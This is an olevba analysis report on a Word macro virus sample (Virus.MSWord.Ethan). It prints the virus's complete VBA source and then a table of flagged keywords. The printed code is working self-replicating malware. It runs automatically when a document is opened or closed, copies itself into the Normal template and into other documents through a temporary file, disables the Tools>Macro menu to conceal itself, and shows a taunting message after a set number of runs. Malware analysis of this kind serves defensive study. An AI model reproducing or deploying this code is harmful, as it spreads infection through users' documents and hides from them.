olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.el-4ebdfe42642a6a3368b16a479c60d2b4ff823b1d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO veremos.cls 
in file: Virus.MSWord.Ethan.el-4ebdfe42642a6a3368b16a479c60d2b4ff823b1d - OLE stream: 'Macros/VBA/veremos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'GRADE SETEMBRO 2001.doc
Private Sub infestor(obj As Object)
'PAnual.doc
   On Error Resume Next
'DOC7.DOC
'hospedaje.doc
   Dim lincod As String
'social 11.doc
   For m = 1 To obj.CodeModule.countoflines
      obj.CodeModule.DeleteLines 1, 1
   Next m
   obj.Name = "veremos"
      Open "C:\Gibtesnicht.sys" For Input As #1
       m = 1
       Do While Not EOF(1)
         Line Input #1, lincod
         obj.CodeModule.insertlines m, lincod
         m = m + 1
       Loop
      Close #1
End Sub
Private Sub copiar(Fuente As Object)
  On Error Resume Next
  If Dir("C:\Gibtesnicht.sys") <> "C:\Gibtesnicht.sys" Then
  Open "C:\Gibtesnicht.sys" For Output As #1
    For i = 1 To Fuente.CodeModule.countoflines
     s = Fuente.CodeModule.lines(i, 1)
'Documento1
'Documento1
     Print #1, s
    Next i
  Close #1
  End If
End Sub
'Doc1.doc
Private Sub document_close()
'Doc1.doc
  On Error Resume Next
  ocultar
'social 11.doc
  Dim op
  op = System.PrivateProfileString("", "HKEY_CURRENT_USER", "Tiempo")
'hospedaje.doc
'social 11.doc
  If Len(op) <> 0 Then
  If CByte(op) = 60 Then
'DOC7.DOC
'hospedaje.doc
   MsgBox "Mire los facil que es estar infestado por un virus macro" _
    & ". Este es una tonteria que no causa daño pero podira facilmente" _
    & " eliminar el contenido de su computadora"
'DOC7.DOC
  Else
   System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Tiempo") = CStr(op + 1)
  End If
  Else
'Documento1
  System.PrivateProfileString("", "HKEY_CURRENT_USER\", "Tiempo") = 0
  End If
  Dim h As Integer
'Documento1
  Dim nor As Object, doc As Object, f As Object
  Set doc = ActiveDocument.VBProject.VBComponents.Item(1)
  Set nor = NormalTemplate.VBProject.VBComponents.Item(1)
  If Application.MacroContainer = ActiveDocument.Name Then
   If nor.Name <> "veremos" Then
'Doc1.doc
      Call copiar(doc)
      Call infestor(nor)
      NormalTemplate.Save
   End If
'Documento1
'Doc1.doc
  Else
     If doc.Name <> "veremos" Then
      Call copiar(nor)
      Call infestor(doc)
      ActiveDocument.Save
      miautor = ActiveDocument.Name
'PAnual.doc
      Dim i As Byte
      For i = 1 To 5
       h = Int((doc.CodeModule.countoflines * Rnd) + 1)
'PAnual.doc
'social 11.doc
'PAnual.doc
'GRADE SETEMBRO 2001.doc
'Doc1.doc
       doc.CodeModule.insertlines h, "'" + miautor
      Next i
     End If
'PAnual.doc
'GRADE SETEMBRO 2001.doc
  End If
'GRADE SETEMBRO 2001.doc
'hospedaje.doc
End Sub
Private Sub document_open()
'social 11.doc
'DOC7.DOC
'GRADE SETEMBRO 2001.doc
 document_close
End Sub
Private Sub ocultar()
'hospedaje.doc
 On Error Resume Next
 Application.CommandBars("Tools").Controls("Macro").Enabled = False
 Application.CommandBars("Tools").Controls("Macro").Enabled = False
'DOC7.DOC
End Sub

















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

